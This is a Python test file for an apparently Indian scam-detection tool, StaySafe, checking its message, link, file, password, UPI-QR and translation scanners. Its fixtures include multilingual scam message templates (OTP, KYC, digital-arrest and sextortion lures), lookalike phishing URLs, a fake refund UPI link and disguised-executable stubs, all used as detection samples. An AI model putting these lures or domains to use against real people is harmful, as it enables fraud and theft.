"""
StaySafe checker tests — real-world scam and genuine samples.

Run from the backend folder (no internet or API keys needed):
    python tests/test_scanners.py          # plain Python, prints a report
    python -m pytest tests                 # if you have pytest installed
"""
import io
import os
import sys
import zipfile

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import scanners.url_scanner as url_scanner  # noqa: E402

# Keep tests offline and fast: no DNS, WHOIS, page fetch, Safe Browsing or VirusTotal
url_scanner.OFFLINE = True

from scanners.message_scanner import analyze_text, check_links_in_result, extract_links  # noqa: E402
from scanners.url_scanner import scan_url  # noqa: E402
from scanners.file_scanner import check_extension_risk, check_content  # noqa: E402
from scanners.password_checker import analyze_strength  # noqa: E402
from scanners.qr_scanner import analyze_upi_string  # noqa: E402

DANGER = ("DANGEROUS", "SCAM_LIKELY")
SAFE = ("SAFE", "LIKELY_SAFE")

# ---------------------------------------------------------------------------
# Messages
# ---------------------------------------------------------------------------
SCAM_MESSAGES = {
    "KYC block": "Dear customer your SBI account will be blocked today. Update PAN immediately: http://sbi-kyc.xyz",
    "OTP request": "Share the code you just received to confirm your delivery",
    "OTP by phone": "Sir I am calling from HDFC, please tell me the OTP you received to stop the transaction",
    "Hinglish electricity": "Aapka bijli connection aaj raat 9:30 baje kaat diya jayega. Turant is number par call karein 9876543210",
    "Electricity": "Dear consumer, your electricity power will be disconnected tonight at 9.30pm because your previous month bill was not updated. Please immediately contact our electricity officer 9876543210",
    "Task job": "Hi, we are hiring for Amazon. Earn Rs 3000/day by liking YouTube videos. Contact on Telegram",
    "Digital arrest": "Your FedEx parcel contains illegal drugs. Mumbai police will arrest you. Join Skype video call now",
    "Lottery": "Congratulations! You have won Rs 25,00,000 in KBC lucky draw. Pay processing fee of Rs 5000 to claim your prize",
    "AnyDesk": "To process your refund please install AnyDesk and share the 9 digit code",
    "UPI PIN": "You have received cashback of Rs 2000. Enter your UPI PIN to receive the amount",
    "Hi mum": "Hi mum, this is my new number, my phone is broken. Can you send 15000 urgently for rent?",
    "Investment": "Join our VIP trading group, guaranteed returns of 30% monthly. Crypto investment tips daily",
    "TRAI": "TRAI notice: your mobile number will be blocked in 2 hours. Press 9 to speak to officer",
    "Tax refund": "Income tax refund of Rs 15,490 approved. Click http://bit.ly/itr-refund to update your account details",
    "WhatsApp code": "Hi, I accidentally sent my WhatsApp code to you. Please send it back urgently",
    "WFH job": "Work from home job. Earn 5000 daily. No experience. Message on WhatsApp",
    "Challan": "You have a pending traffic challan of Rs 500. Pay now: echallan-parivahan.top",
}

GENUINE_MESSAGES = {
    "Bank OTP": "Your OTP for login is 482913. Do not share this OTP with anyone. -HDFC Bank",
    "Amazon OTP": "482913 is your Amazon OTP. Do not share it with anyone.",
    "Pin photo": "Can you pick up milk on the way home? Also pin the photo in the group",
    "Order shipped": "Your Amazon order has been shipped. Track: https://amazon.in/track",
    "Work urgency": "Urgent: team meeting moved to 3pm, please join",
    "Refund done": "Your refund of Rs 499 has been processed to your original payment method.",
    "Debit alert": "Rs 250.00 debited from A/c XX1234 on 27-09-26 to VPA swiggy@icici. If not done by you, call 18002586161 - SBI",
    "Friend": "bro send me the notes pdf pls, exam tomorrow",
    "Plan expiry": "Your Jio plan expires in 3 days. Recharge at https://www.jio.com to continue enjoying services.",
    "Share code": "I will share the code on github tonight",
    "Customs delay": "My parcel from Amazon is delayed by customs",
    "Wifi": "Can you share the wifi password?",
    "Challan paid": "Your e-challan payment of Rs 500 is successful. Thank you",
    "Discount code": "Use code SAVE10, I sent the wrong code by mistake earlier",
}


def test_scam_messages_detected():
    for name, text in SCAM_MESSAGES.items():
        # the full check, including the links inside the message
        result = check_links_in_result(analyze_text(text))
        assert result["verdict"] == "SCAM_LIKELY", (name, result)


def test_genuine_messages_not_flagged():
    for name, text in GENUINE_MESSAGES.items():
        result = analyze_text(text)
        assert result["verdict"] == "LIKELY_SAFE", (name, result)


NEW_RULE_SAMPLES = {
    "Asks you to install an app from a link or file (APK)": "Hello, you are invited to our wedding. Please see the invitation card: wedding-card.apk",
    "Instant loan with no documents or checks": "Get instant loan of Rs 50,000 without documents. No CIBIL check",
    "Fake government scheme, Aadhaar, PAN or gas update": "PM Kisan: your installment is stopped. Update your KYC here: http://pmkisan-kyc.xyz",
    "Reward points or cashback that 'expire today'": "Your SBI credit card reward points worth Rs 7,850 expire today. Redeem now",
    "Threatens to share your photos or videos (blackmail)": "I have your video. Pay 20000 or I will make it viral and send to your family",
    "Asks for payment by gift card or crypto": "Buy 5 Google Play gift cards of Rs 2000 and send me the codes",
    "Asks for your Aadhaar, PAN or bank account details": "Please share your Aadhaar card and bank account number to receive the amount",
    "Asks you to keep it secret": "Do not tell anyone about this call, this is a confidential police matter",
    "Free recharge, data or gifts with a link": "Free 3 months Jio recharge for all users. Claim now: jio-free.xyz",
}
NEW_RULE_GENUINE = [
    "Download the Swiggy app from the Play Store to order",
    "Your loan EMI of Rs 5,400 is due on 5th. Pay via the HDFC app",
    "Please bring your Aadhaar card for the college admission tomorrow",
    "I got free data with my new Airtel plan",
]


def test_new_rules():
    for label, text in NEW_RULE_SAMPLES.items():
        result = analyze_text(text)
        assert label in result["patterns_detected"], (label, result["patterns_detected"])
        assert result["verdict"] != "LIKELY_SAFE", (label, result)
    for text in NEW_RULE_GENUINE:
        assert analyze_text(text)["verdict"] == "LIKELY_SAFE", text


KANNADA_HINDI_SCAMS = {
    "kn bank block": "ಆತ್ಮೀಯ ಗ್ರಾಹಕರೇ, ನಿಮ್ಮ ಬ್ಯಾಂಕ್ ಖಾತೆ ಇಂದು ಬ್ಲಾಕ್ ಆಗುತ್ತದೆ. ತಕ್ಷಣ KYC ಅಪ್‌ಡೇಟ್ ಮಾಡಿ",
    "kn OTP ask": "ನಿಮಗೆ ಬಂದ OTP ಯನ್ನು ತಕ್ಷಣ ಹೇಳಿ",
    "kn electricity": "ನಿಮ್ಮ ಕರೆಂಟ್ ಇಂದು ರಾತ್ರಿ 9:30 ಕ್ಕೆ ಕಟ್ ಆಗುತ್ತದೆ. ಈ ನಂಬರ್‌ಗೆ ಕರೆ ಮಾಡಿ 9876543210",
    "kn lottery": "ಅಭಿನಂದನೆಗಳು! ನೀವು ಲಕ್ಕಿ ಡ್ರಾದಲ್ಲಿ ₹25 ಲಕ್ಷ ಗೆದ್ದಿದ್ದೀರಿ. ಪ್ರೊಸೆಸಿಂಗ್ ಶುಲ್ಕ ₹5000 ಕಟ್ಟಿ",
    "kn digital arrest": "ನಿಮ್ಮ ಪಾರ್ಸೆಲ್‌ನಲ್ಲಿ ಡ್ರಗ್ಸ್ ಸಿಕ್ಕಿದೆ. ಮುಂಬೈ ಪೊಲೀಸ್ ನಿಮ್ಮನ್ನು ಅರೆಸ್ಟ್ ಮಾಡುತ್ತಾರೆ. ವೀಡಿಯೊ ಕಾಲ್‌ಗೆ ಬನ್ನಿ",
    "kn task job": "ಮನೆಯಿಂದಲೇ ದಿನಕ್ಕೆ ₹3000 ಗಳಿಸಿ. ಯೂಟ್ಯೂಬ್ ವೀಡಿಯೊ ಲೈಕ್ ಮಾಡಿ. ನೋಂದಣಿ ಶುಲ್ಕ ₹500",
    "kn UPI PIN": "ಕ್ಯಾಶ್‌ಬ್ಯಾಕ್ ಪಡೆಯಲು ನಿಮ್ಮ UPI PIN ಹಾಕಿ",
    "kn new number": "ಅಮ್ಮಾ ಇದು ನನ್ನ ಹೊಸ ನಂಬರ್, ಫೋನ್ ಕಳೆದುಹೋಯಿತು. ತುರ್ತಾಗಿ 10000 ಹಣ ಕಳುಹಿಸಿ",
    "tulu bank + OTP": "ಈರೆನ ಖಾತೆ ಇನಿ ಬ್ಲಾಕ್ ಆಪುಂಡು. ಬೇಗನೇ OTP ಪನ್ಲೆ",
    "hi bank block": "आपका बैंक खाता आज बंद हो जाएगा। तुरंत KYC अपडेट करें",
    "hi OTP ask": "आपको आया हुआ OTP तुरंत बताइए",
    "hi electricity": "आपकी बिजली आज रात 9:30 बजे काट दी जाएगी। तुरंत इस नंबर पर कॉल करें 9876543210",
    "hi lottery": "बधाई हो! आपने लकी ड्रॉ में ₹25 लाख जीते हैं। प्रोसेसिंग फीस ₹5000 भेजें",
    "hi digital arrest": "आपके पार्सल में ड्रग्स मिले हैं। मुंबई पुलिस आपको गिरफ्तार करेगी। वीडियो कॉल पर आइए",
    "hi task job": "घर बैठे रोज ₹3000 कमाएं। यूट्यूब वीडियो लाइक करें। रजिस्ट्रेशन फीस ₹500",
    "hi new number": "मम्मी यह मेरा नया नंबर है, फोन खो गया। तुरंत 10000 पैसे भेज दो",
}

KANNADA_HINDI_GENUINE = {
    "kn bank OTP": "ನಿಮ್ಮ OTP 482913. ಇದನ್ನು ಯಾರಿಗೂ ಹೇಳಬೇಡಿ - SBI",
    "kn debit alert": "ನಿಮ್ಮ ಖಾತೆಯಿಂದ ₹250 ಕಡಿತವಾಗಿದೆ. ನೀವು ಮಾಡದಿದ್ದರೆ 1800111109 ಗೆ ಕರೆ ಮಾಡಿ",
    "kn family": "ಅಮ್ಮ, ಸಂಜೆ ಬರುವಾಗ ಹಾಲು ತನ್ನಿ",
    "kn bill": "ನಿಮ್ಮ ಕರೆಂಟ್ ಬಿಲ್ ₹450. ದಯವಿಟ್ಟು ಪಾವತಿಸಿ - ಮೆಸ್ಕಾಂ",
    "tulu OTP": "ಈರೆನ OTP 4829. ಏರೆಗ್‌ಲಾ ಕೊರೊಡ್ಚಿ",
    "hi bank OTP": "आपका OTP 482913 है। इसे किसी के साथ भी शेयर न करें - HDFC",
    "hi debit alert": "आपके खाते से ₹250 डेबिट हुए। अगर यह आपने नहीं किया तो 1800 पर कॉल करें",
    "hi school fee": "आपकी स्कूल फीस ₹5000 जमा करें - अंतिम तिथि 30 सितंबर",
    "hi family": "मम्मी, शाम को दूध ले आना",
}


def test_kannada_hindi_scams_detected():
    for name, text in KANNADA_HINDI_SCAMS.items():
        result = analyze_text(text)
        assert result["verdict"] == "SCAM_LIKELY", (name, result)


def test_kannada_hindi_genuine_not_flagged():
    for name, text in KANNADA_HINDI_GENUINE.items():
        result = analyze_text(text)
        assert result["verdict"] == "LIKELY_SAFE", (name, result)


def test_unsupported_language_is_not_called_safe():
    result = analyze_text("আপনার ব্যাংক অ্যাকাউন্ট আজ বন্ধ হয়ে যাবে। এখনই KYC আপডেট করুন")  # Bengali — no built-in rules yet
    assert result["verdict"] == "UNCERTAIN", result


MORE_LANGUAGE_SCAMS = {
    "ta bank": "உங்கள் வங்கி கணக்கு இன்று முடக்கப்படும். உடனே KYC புதுப்பிக்கவும்",
    "ta otp": "உங்களுக்கு வந்த OTP ஐ உடனே சொல்லுங்கள்",
    "te bank": "మీ బ్యాంక్ ఖాతా ఈరోజు బ్లాక్ అవుతుంది. వెంటనే KYC అప్డేట్ చేయండి",
    "te arrest": "మీ పార్సెల్‌లో డ్రగ్స్ ఉన్నాయి. పోలీస్ మిమ్మల్ని అరెస్ట్ చేస్తారు. వీడియో కాల్‌కు రండి",
    "ml otp": "നിങ്ങൾക്ക് വന്ന OTP ഉടൻ പറയൂ",
    "ml power": "നിങ്ങളുടെ വൈദ്യുതി ഇന്ന് രാത്രി വിച്ഛേദിക്കും. ഉടൻ 9876543210 വിളിക്കുക",
    "mr bank": "तुमचे बँक खाते आज बंद होईल. ताबडतोब KYC अपडेट करा",
    "mr otp": "तुम्हाला आलेला OTP लगेच सांगा",
}
MORE_LANGUAGE_GENUINE = {
    "ta otp": "உங்கள் OTP 482913. இதை யாருடனும் பகிர வேண்டாம் - SBI",
    "te otp": "మీ OTP 482913. దీన్ని ఎవరితోనూ షేర్ చేయవద్దు - SBI",
    "ml otp": "നിങ്ങളുടെ OTP 482913. ഇത് ആരുമായും പങ്കിടരുത് - SBI",
    "mr otp": "तुमचा OTP 482913 आहे. तो कोणालाही सांगू नका - SBI",
}


def test_tamil_telugu_malayalam_marathi_without_translation():
    for name, text in MORE_LANGUAGE_SCAMS.items():
        assert analyze_text(text)["verdict"] == "SCAM_LIKELY", name
    for name, text in MORE_LANGUAGE_GENUINE.items():
        assert analyze_text(text)["verdict"] == "LIKELY_SAFE", name


def test_hidden_link_gets_a_tip():
    result = check_links_in_result(analyze_text("Your KYC is pending. Click here to update now"))
    assert any("Copy link" in n for n in result["notes"]), result


def test_links_found_in_messages():
    links = extract_links("Track at amazon.in/track or www.sbi-kyc.xyz/login. Mail a@b.com at 9.30pm (http://bit.ly/x)")
    assert links == ["https://amazon.in/track", "https://www.sbi-kyc.xyz/login", "http://bit.ly/x"], links


def test_dangerous_link_makes_message_risky():
    result = check_links_in_result(analyze_text("Your parcel is waiting. Confirm address at amaz0n-delivery.com/track"))
    assert result["verdict"] == "SCAM_LIKELY", result
    assert result["links_checked"][0]["verdict"] == "DANGEROUS"


def test_real_link_keeps_message_safe():
    result = check_links_in_result(analyze_text("Your Amazon order has shipped. Track: https://amazon.in/track"))
    assert result["verdict"] == "LIKELY_SAFE", result


# ---------------------------------------------------------------------------
# Links
# ---------------------------------------------------------------------------
PHISHING_URLS = [
    "https://sbi-kyc-update.in/login",
    "https://amaz0n-offers.com",
    "https://paypal.com.secure-login.verify-account.ru/x",
    "https://hdfc-netbanking-verify.xyz",
    "https://rewards-paytm.top/claim",
    "https://sbi-kyc.vercel.app",
]
REAL_URLS = [
    "https://google.com",
    "https://www.amazon.in/deal",
    "https://netbanking.hdfcbank.com/login",
    "https://onlinesbi.sbi",
    "https://www.irctc.co.in",
    "https://github.com/sathwikraibs/StaySafe",
    "https://staysafe-tool.vercel.app",
]


def test_phishing_urls_flagged():
    for url in PHISHING_URLS:
        result = scan_url(url)
        assert result["verdict"] == "DANGEROUS", (url, result)


def test_real_urls_safe():
    for url in REAL_URLS:
        result = scan_url(url)
        assert result["verdict"] == "SAFE", (url, result)


# ---- Live-style link checks, with the internet lookups replaced by fakes
def _online(dns=True, age=900, gsb=False, vt=None, page=None):
    """Run scan_url as if online. page = dict of fetch_page fields to override."""
    saved = {k: getattr(url_scanner, k) for k in
             ("OFFLINE", "resolve_host", "whois_age_days", "check_safe_browsing", "check_virustotal", "fetch_page")}
    base_page = {"ok": True, "final_url": None, "hops": [], "status": 200, "ssl_error": False, "title": "Welcome",
                 "has_password": False, "text": "welcome to our shop", "download": None, "blocked": False, "error": None}

    def fake_page(url):
        out = dict(base_page, **(page or {}))
        out["final_url"] = out["final_url"] or url
        return out

    url_scanner.OFFLINE = False
    url_scanner.resolve_host = lambda host: {"exists": dns, "ips": ["93.184.216.34"] if dns else []}
    url_scanner.whois_age_days = lambda domain: age
    url_scanner.check_safe_browsing = lambda urls: {"listed": gsb, "threats": ["SOCIAL_ENGINEERING"] if gsb else []}
    url_scanner.check_virustotal = lambda url, domain, *_: vt or {"status": "ok", "malicious": 0, "suspicious": 0,
                                                             "harmless": 60, "engines": 90, "domain_malicious": 0}
    url_scanner.fetch_page = fake_page
    url_scanner.ensure_feeds = lambda: None  # no downloads in tests
    url_scanner.ensure_big_feeds = lambda: None
    url_scanner.first_certificate_days = lambda host: None
    if not url_scanner._FEEDS["urls"]:
        url_scanner._FEEDS["urls"] = {"example.invalid/x": "test"}
    try:
        return lambda u: url_scanner.scan_url(u)
    finally:
        pass


def _restore():
    import importlib
    importlib.reload(url_scanner)
    url_scanner.OFFLINE = True


def _scan_online(url, **kw):
    try:
        return _online(**kw)(url)
    finally:
        _restore()


def test_website_that_does_not_exist_is_risky():
    r = _scan_online("https://my-free-gift-card.com", dns=False, age=None, vt={"status": "not_found"},
                     page={"ok": False, "error": "no_dns"})
    assert r["verdict"] == "DANGEROUS", r
    assert any(c["id"] == "exists" and c["status"] == "fail" for c in r["checks"]), r["checks"]


def test_google_blocklist_hit_is_always_risky():
    r = _scan_online("https://normal-looking-shop.com/offer", gsb=True)
    assert r["verdict"] == "DANGEROUS" and r["risk_score"] >= 90, r


def test_virustotal_hits_are_risky():
    r = _scan_online("https://normal-looking-shop.com", vt={"status": "ok", "malicious": 7, "suspicious": 1,
                                                          "harmless": 50, "engines": 90, "domain_malicious": 0})
    assert r["verdict"] == "DANGEROUS", r


def test_short_link_to_fake_bank_page_is_risky():
    r = _scan_online("https://bit.ly/abc123", page={"final_url": "https://sbi-rewards-kyc.top/login",
                                                   "hops": ["https://sbi-rewards-kyc.top/login"]})
    assert r["verdict"] == "DANGEROUS", r
    assert any(c["id"] == "redirect" and c["status"] == "warn" for c in r["checks"])


def test_fake_login_page_is_risky():
    r = _scan_online("https://secure-portal-7731.com/", page={"has_password": True, "title": "HDFC Bank NetBanking",
                                                            "text": "hdfc bank login customer id password"})
    assert r["verdict"] == "DANGEROUS", r


def test_brand_new_website_is_not_called_safe():
    r = _scan_online("https://best-deals-store.com", age=9)
    assert r["verdict"] != "SAFE", r


def test_misspelled_brand_names_are_risky():
    for u in ("https://amazom.in", "https://flipkarrt.com", "https://whatsaap.com/join"):
        r = _scan_online(u)
        assert r["verdict"] == "DANGEROUS", (u, r)


def test_words_that_look_like_brands_are_fine():
    for u in ("https://tomato.com", "https://www.apply.com", "https://kodak.com", "https://japan-guide.com"):
        r = _scan_online(u)
        assert r["verdict"] == "SAFE", (u, r)


def test_normal_old_website_is_safe():
    r = _scan_online("https://www.example-bakery.in/menu", age=3000)
    assert r["verdict"] == "SAFE", r
    assert all(c["status"] in ("pass", "info") for c in r["checks"]), r["checks"]


def test_broken_certificate_is_not_safe():
    r = _scan_online("https://some-shop.com", page={"ok": False, "ssl_error": True, "error": "ssl"})
    assert r["verdict"] != "SAFE", r


def test_link_that_downloads_an_app_is_risky():
    r = _scan_online("https://get-rewards.com/app", page={"download": "apk"})
    assert r["verdict"] == "DANGEROUS", r


def test_public_scam_list_hit_is_risky():
    try:
        scan = _online(age=2000)
        url_scanner._FEEDS["urls"] = {"normal-shop-offers.com/win": "OpenPhish"}
        url_scanner._FEEDS["hosts"] = {"normal-shop-offers.com": "OpenPhish"}
        r = scan("https://normal-shop-offers.com/win")
        assert r["verdict"] == "DANGEROUS", r
        r2 = scan("https://normal-shop-offers.com/other")
        assert any(c["id"] == "feeds" and c["status"] == "warn" for c in r2["checks"]), r2
    finally:
        _restore()



def _big_lists(links=(), domains=(), tranco=None):
    fp = url_scanner._sorted_fingerprints
    url_scanner._BIG["links"] = {"Phishing.Database": fp(url_scanner._fingerprint(url_scanner._feed_key(u)) for u in links)}
    url_scanner._BIG["domains"] = {"Phishing Army": fp(url_scanner._fingerprint(d) for d in domains)}
    url_scanner._TRANCO["ranks"] = tranco or {}


def test_big_phishing_lists():
    try:
        scan = _online(age=2000)
        _big_lists(links=["http://sites.google.com/view/sbi-kyc-update"],
                   domains=["sbi-rewards-claim.com", "docs.google.com", "hdfc-login.web.app"])
        r = scan("https://sbi-rewards-claim.com/")                       # whole scam website listed
        assert r["verdict"] == "DANGEROUS" and any(c["id"] == "feeds" and c["status"] == "fail" for c in r["checks"]), r
        r = scan("https://hdfc-login.web.app/")                          # scam page on free hosting
        assert r["verdict"] == "DANGEROUS", r
        r = scan("https://docs.google.com/document/d/abc")               # big shared site: never condemned
        assert r["verdict"] == "SAFE", r
        r = scan("https://sites.google.com/view/sbi-kyc-update")         # but an exact listed page is
        assert r["verdict"] == "DANGEROUS", r
    finally:
        _restore()


def test_popular_sites_get_fewer_false_alarms_but_lookalikes_do_not():
    try:
        scan = _online(age=None)
        _big_lists(tranco={"zomato.com": 900, "some-blog-site.net": 60000})
        r = scan("http://zomato.com/offers-login-reward")                 # risky words, no https, age unknown
        assert r["risk_score"] <= 20 and any(c["id"] == "known" and c["status"] == "pass" for c in r["checks"]), r
        r = scan("https://zomat0-offers.com/login")                       # lookalike: not in the list
        assert r["risk_score"] > 20, r
    finally:
        _restore()


def test_first_certificate_date_used_when_registration_hidden():
    try:
        scan = _online(age=None)
        url_scanner.first_certificate_days = lambda host: 4
        r = scan("https://fresh-offer-store.com/")
        assert any(c["id"] == "age" and c["status"] == "fail" and c["value"] == 4 for c in r["checks"]), r["checks"]
    finally:
        _restore()


def test_rdap_gives_age_when_whois_fails():
    class R:
        status_code = 200
        def json(self):
            return {"events": [{"eventAction": "registration", "eventDate": "2026-09-20T10:00:00Z"}],
                    "entities": [{"roles": ["registrar"], "vcardArray": ["vcard", [["fn", {}, "text", "Test Registrar"]]]}]}
    real_get = url_scanner.requests.get
    try:
        url_scanner.OFFLINE = False
        url_scanner.whois = None
        url_scanner.requests.get = lambda *a, **k: R()
        info = url_scanner.whois_details("brand-new-shop.in")
        assert info["registrar"] == "Test Registrar" and info["created"] == "2026-09-20" and info["age_days"] < 30, info
    finally:
        url_scanner.requests.get = real_get
        _restore()


def test_ip_address_no_fake_subdomain_warning():
    result = scan_url("http://192.168.1.5/login")
    assert not any("sub-domain" in f for f in result["findings"]), result


# ---------------------------------------------------------------------------
# Files
# ---------------------------------------------------------------------------
def _zip(entries):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        for name, data in entries.items():
            z.writestr(name, data)
    return buf.getvalue()


def _file_score(name, data):
    ext_score, _ = check_extension_risk(name)
    content_score, _, real_type = check_content(name, data)
    return min(100, ext_score + content_score), real_type


def test_program_disguised_as_photo():
    score, real_type = _file_score("photo.jpg", b"MZ\x90\x00" + b"\x00" * 100)
    assert real_type == "Windows program" and score >= 50


def test_apk_disguised_as_pdf():
    score, real_type = _file_score("Payment.pdf", _zip({"AndroidManifest.xml": "x", "classes.dex": "x"}))
    assert real_type == "Android app" and score >= 50


def test_double_extension_with_spaces():
    score, _ = _file_score("invoice.pdf      .exe", b"MZ")
    assert score >= 50


def test_zip_with_program_inside():
    score, _ = _file_score("docs.zip", _zip({"Invoice.pdf.exe": "MZ"}))
    assert score >= 40


def test_docx_with_macros():
    score, _ = _file_score("report.docx", _zip({"word/document.xml": "<x/>", "word/vbaProject.bin": "x"}))
    assert score >= 50


def test_real_image_is_safe():
    score, real_type = _file_score("photo.jpg", b"\xff\xd8\xff\xe0" + b"\x00" * 100)
    assert real_type == "JPEG image" and score == 0


# ---------------------------------------------------------------------------
# Passwords
# ---------------------------------------------------------------------------
def test_weak_passwords():
    for pw in ["Password@123", "Qwerty@12345", "P@ssw0rd2024!", "India@123", "Adm1n#2023"]:
        assert analyze_strength(pw)["strength_label"] == "Weak", pw


def test_strong_passwords():
    for pw in ["T7#kq9!Lm2&vZx", "blue-Mango-river-42"]:
        assert analyze_strength(pw)["strength_label"] == "Strong", pw


# ---------------------------------------------------------------------------
# UPI QR
# ---------------------------------------------------------------------------
def test_fake_refund_upi_qr():
    result = analyze_upi_string("upi://pay?pa=9876543210@ybl&pn=Refund%20Desk&am=15000&tn=Cashback%20refund")
    assert result["verdict"] == "DANGEROUS", result


def test_normal_shop_upi_qr():
    result = analyze_upi_string("upi://pay?pa=shop@okaxis&pn=Ravi%20Stores")
    assert result["verdict"] == "SAFE", result


# ---------------------------------------------------------------------------
# Translation (Google Cloud Translation is replaced by a fake — no internet needed)
# ---------------------------------------------------------------------------
import scanners.translator as translator  # noqa: E402
from scanners.message_scanner import add_translation  # noqa: E402

FAKE_TRANSLATIONS = {
    ("আপনার ব্যাংক অ্যাকাউন্ট আজ বন্ধ হয়ে যাবে। এখনই KYC আপডেট করুন", "en"):
        ("Your bank account will be blocked today. Update KYC immediately", "bn"),
    ("ನಿಮಗೆ ಬಂದ OTP ಯನ್ನು ತಕ್ಷಣ ಹೇಳಿ", "en"): ("Tell me the OTP you received immediately", "kn"),
    ("Your SBI account will be blocked today. Update KYC now", "kn"):
        ("ನಿಮ್ಮ SBI ಖಾತೆ ಇಂದು ಬ್ಲಾಕ್ ಆಗುತ್ತದೆ. ಈಗಲೇ KYC ಅಪ್‌ಡೇಟ್ ಮಾಡಿ", "en"),
}


class _FakeResponse:
    def __init__(self, status, payload):
        self.status_code, self._payload = status, payload

    def json(self):
        return self._payload

    def raise_for_status(self):
        if self.status_code >= 400:
            raise RuntimeError(self.status_code)


def _use_fake_google(status=200, mymemory="ok", google_message="Cloud Translation API has not been used in project"):
    """Fake Google (POST) and MyMemory (GET). calls = list of (provider, text, target)."""
    calls = []

    def fake_post(url, params=None, json=None, timeout=None):
        calls.append(("google", json["q"], json["target"]))
        if status != 200:
            return _FakeResponse(status, {"error": {"message": google_message}})
        text, src = FAKE_TRANSLATIONS.get((json["q"], json["target"]), (json["q"], "en"))
        return _FakeResponse(200, {"data": {"translations": [{"translatedText": text, "detectedSourceLanguage": src}]}})

    def fake_get(url, params=None, timeout=None):
        src, target = params["langpair"].split("|")
        calls.append(("mymemory", params["q"], target))
        if mymemory == "quota":
            return _FakeResponse(200, {"responseStatus": 429, "responseData": {"translatedText":
                "MYMEMORY WARNING: YOU USED ALL AVAILABLE FREE TRANSLATIONS FOR TODAY"}})
        if mymemory == "fuzzy":
            # what caused wrong translations: only a saved sentence about something else
            return _FakeResponse(200, {"responseStatus": 200, "responseData": {"translatedText": "Thank you for your purchase", "match": 0.6},
                                       "matches": [{"segment": "ನಿಮ್ಮ ಖರೀದಿಗೆ ಧನ್ಯವಾದ", "translation": "Thank you for your purchase", "match": 0.6, "created-by": "MateCat"}]})
        text, _ = FAKE_TRANSLATIONS.get((params["q"], target), (params["q"], src))
        # real MyMemory shape: the machine translation plus an unrelated "similar sentence" ranked higher
        return _FakeResponse(200, {"responseStatus": 200, "responseData": {"translatedText": "Your account is active", "match": 0.9},
                                   "matches": [{"segment": "ನಿಮ್ಮ ಖಾತೆ ಸಕ್ರಿಯವಾಗಿದೆ", "translation": "Your account is active", "match": 0.9, "created-by": "MateCat"},
                                               {"segment": params["q"], "translation": text, "match": 0.85, "created-by": "MT!"}]})

    os.environ["TRANSLATE_API_KEY"] = "test-key"
    for k in ("GEMINI_API_KEY", "BHASHINI_USER_ID", "BHASHINI_API_KEY", "GEMINI_MODEL"):
        os.environ.pop(k, None)
    translator._GEMINI.update(model=None, minute=[], day_count=0)
    translator._GEMINI_GONE.clear()
    translator._GEMINI_DAY_DONE.clear()
    translator._GEMINI_EXTRA.clear()
    translator._GEMINI_COOL.clear()
    translator._BHASHINI_CFG.clear()
    translator.requests.post = fake_post
    translator.requests.get = fake_get
    translator._cache.clear()
    translator._paused_until.update({p: 0.0 for p in translator.PROVIDERS})
    translator._problem.update({p: None for p in translator.PROVIDERS})
    translator._usage["chars"] = 0
    from scanners.quota import QUOTAS
    for q in QUOTAS.values():
        q.reset()
    return calls


def test_translation_lets_us_check_other_languages():
    _use_fake_google()
    result = add_translation(analyze_text("আপনার ব্যাংক অ্যাকাউন্ট আজ বন্ধ হয়ে যাবে। এখনই KYC আপডেট করুন"), "en")  # Bengali
    assert result["verdict"] == "SCAM_LIKELY", result
    assert result["translation"]["from"] == "bn" and "blocked" in result["translation"]["text"]


def test_kannada_message_explained_in_english():
    _use_fake_google()
    result = add_translation(analyze_text("ನಿಮಗೆ ಬಂದ OTP ಯನ್ನು ತಕ್ಷಣ ಹೇಳಿ"), "en")
    assert result["verdict"] == "SCAM_LIKELY"
    assert result["translation"]["to"] == "en" and "OTP" in result["translation"]["text"]


def test_english_message_explained_in_kannada_and_tulu():
    for ui in ("kn", "tcy"):  # Tulu isn't in Google's API, so Tulu readers get Kannada
        calls = _use_fake_google()
        result = add_translation(analyze_text("Your SBI account will be blocked today. Update KYC now"), ui)
        assert result["translation"]["to"] == "kn", (ui, result)
        assert calls == [("google", "Your SBI account will be blocked today. Update KYC now", "kn")]


def test_english_message_on_english_site_costs_nothing():
    calls = _use_fake_google()
    result = add_translation(analyze_text("Your order has shipped"), "en")
    assert calls == [] and "translation" not in result


def test_google_quota_or_trial_end_falls_back_to_free_mymemory():
    for status, message in ((429, "Quota exceeded for quota metric 'Characters per day'"),
                            (403, "Billing account for project is disabled / trial ended")):
        calls = _use_fake_google(status=status, google_message=message)
        result = add_translation(analyze_text("আপনার ব্যাংক অ্যাকাউন্ট আজ বন্ধ হয়ে যাবে। এখনই KYC আপডেট করুন"), "en")
        assert result["verdict"] == "SCAM_LIKELY", (status, result)
        assert result["translation"]["provider"] == "mymemory"
        # Google is now paused: the next message goes straight to the free fallback
        calls.clear()
        translator._cache.clear()
        add_translation(analyze_text("আপনার ব্যাংক অ্যাকাউন্ট আজ বন্ধ হয়ে যাবে। এখনই KYC আপডেট করুন"), "en")
        assert all(c[0] == "mymemory" for c in calls), calls


def test_everything_used_up_falls_back_to_built_in_rules():
    _use_fake_google(status=429, mymemory="quota", google_message="Quota exceeded")
    bengali = add_translation(analyze_text("আপনার ব্যাংক অ্যাকাউন্ট আজ বন্ধ হয়ে যাবে। এখনই KYC আপডেট করুন"), "en")
    assert bengali["verdict"] == "UNCERTAIN" and "translation" not in bengali  # honest, not "safe"
    translator._cache.clear()
    tamil = add_translation(analyze_text(MORE_LANGUAGE_SCAMS["ta bank"]), "en")
    assert tamil["verdict"] == "SCAM_LIKELY"  # built-in Tamil rules still work
    assert translator._problem["mymemory"]  # MyMemory paused itself for the day


def test_without_google_key_mymemory_still_translates():
    _use_fake_google()
    os.environ.pop("TRANSLATE_API_KEY"); os.environ.pop("GSB_API_KEY", None)
    result = add_translation(analyze_text("আপনার ব্যাংক অ্যাকাউন্ট আজ বন্ধ হয়ে যাবে। এখনই KYC আপডেট করুন"), "en")
    assert result["translation"]["provider"] == "mymemory" and result["verdict"] == "SCAM_LIKELY"


def test_daily_limit_protects_free_tier():
    calls = _use_fake_google()
    from scanners.quota import quota
    quota("google_translate").take(cost=translator.DAILY_LIMIT, priority="high")  # today's Google budget used up
    result = add_translation(analyze_text("ನಿಮಗೆ ಬಂದ OTP ಯನ್ನು ತಕ್ಷಣ ಹೇಳಿ"), "en")
    assert not any(c[0] == "google" for c in calls)  # Google not called at all
    assert result["verdict"] == "SCAM_LIKELY"  # native rules still work



